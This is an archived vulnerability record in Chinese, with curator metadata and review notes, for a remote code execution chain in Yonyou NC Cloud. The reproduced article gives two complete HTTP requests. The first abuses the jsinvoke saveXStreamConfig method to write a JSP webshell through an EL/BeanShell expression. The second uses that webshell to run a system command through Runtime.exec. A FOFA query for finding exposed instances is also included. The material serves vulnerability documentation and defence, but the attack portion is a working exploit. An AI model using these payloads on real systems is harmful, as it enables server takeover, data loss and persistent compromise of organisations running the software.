---
source: "MrWQ/vulnerability-paper"
title: "用友NCCloud jsinvoke saveXStreamConfig文件写入远程代码执行链"
product: "用友NCCloud"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "全版本声明无依据"
prerequisites: "前台，后触发BeanShell/EL条件"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/VJ_hY0YrqKPCBbjltZxOWw"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BNC/%E7%94%A8%E5%8F%8B%20NC%20Cloud%20%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%E9%99%84%20POC%20%E8%BD%AF%E4%BB%B6.md"
id: "vw-ed7b9d4a0f26d98b17690783"
entity_id: "ve-ed7b9d4a0f26d98b17690783"
schema_version: "1"
previous_fofa_unverified: "查询语句"
fofa: "app=\"用友 - NC-Cloud\""
---

# 用友NCCloud jsinvoke saveXStreamConfig文件写入远程代码执行链

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

## 条目说明

- 对象与具体问题：用友NCCloud；jsinvoke saveXStreamConfig文件写入RCE链
- 版本、配置及部署条件：全版本声明无依据
- 认证与权限前提：前台，后触发BeanShell/EL条件
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同151但文件名823780482前后统一、HTTP空行完整可替换坏副本
- 全版本与其他文有限列表矛盾，修复尚未发布必须绑定原文日期
- FOFA只查询语句，空编号与营销删除；缺服务端根因/修复build

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VJ_hY0YrqKPCBbjltZxOWw)

用友 NC Cloud 存在前台远程命令执行漏洞 附 POC 软件
=================================

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. 用友 NC Cloud 简介
-----------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

用友网络是全球领先的企业与公共组织软件、云服务、金融服务提供商。提供营销、制造、财务、人力等产品与服务，帮助客户实现发展目标，进而推动商业和社会进步。

2. 漏洞描述
-------

NC Cloud 是用友推出的大型企业数字化平台。 用友网络科技股份有限公司 NC Cloud 存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

全版本 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b8sCa3Pb0uLRwM6DpygSwJLFjbdH38vx9jIVpXzsU1npFD5ZoFx29d1uicSjG6y2v3WsRtH7JibUJg/640?wx_fmt=png)

4.fofa 查询语句
-----------

app="用友 - NC-Cloud"

5. 漏洞复现
-------

漏洞链接：http://127.0.0.1/823780482.jsp?error=bsh.Interpreter

漏洞数据包, 如下，该数据包上传 823780482.jsp 的 webshell

```http
POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
Content-Length: 253
Content-Type: application/x-www-form-urlencoded

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/823780482.jsp"]}


```

> 请求长度说明：原资料 Content-Length 为 253；保留原始标头；其数值未据实际请求体重新计算或验证。

访问如下数据包执行命令，如下执行 ipconfig 命令

```http
POST /823780482.jsp?error=bsh.Interpreter HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())


```

> 请求长度说明：原资料 Content-Length 为 98；保留原始标头；其数值未据实际请求体重新计算或验证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b8sCa3Pb0uLRwM6DpygSwJABdyoNHowTp6wEWmMeC5O09YXupl644heib02aeRol1aBYCEuGDEaow/640?wx_fmt=png)

6.POC&EXP
---------

关注公众号  南风漏洞复现文库 并回复  漏洞复现 43  即可获得该 POC 工具下载地址： 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b8sCa3Pb0uLRwM6DpygSwJ9h1cx03CSDQY33TBzlUiblojxNZn6CibWPiauf56qA2oaQMkR4iccSYFLA/640?wx_fmt=png)

7. 整改意见
-------

厂商尚未提供漏洞修复方案，请关注厂商主页更新： https://www.yonyou.com/

8. 往期回顾
-------

[金蝶云星空管理中心存在反序列化命令执行 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484124&idx=1&sn=4865340bc137822d6cd9b530e852cda0&chksm=974b8fdba03c06cdd40213b1d8b84172c0d5670da076e84440ccab791b90ec9974d4e23766e4&scene=21#wechat_redirect)  

[大华智慧园区综合管理平台存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484114&idx=1&sn=bfe621f434e790f4afd2642d27e70b6d&chksm=974b8fd5a03c06c3df5ac96567330b514267df730f89b563e9b09b56bf9868c9a54808002a85&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
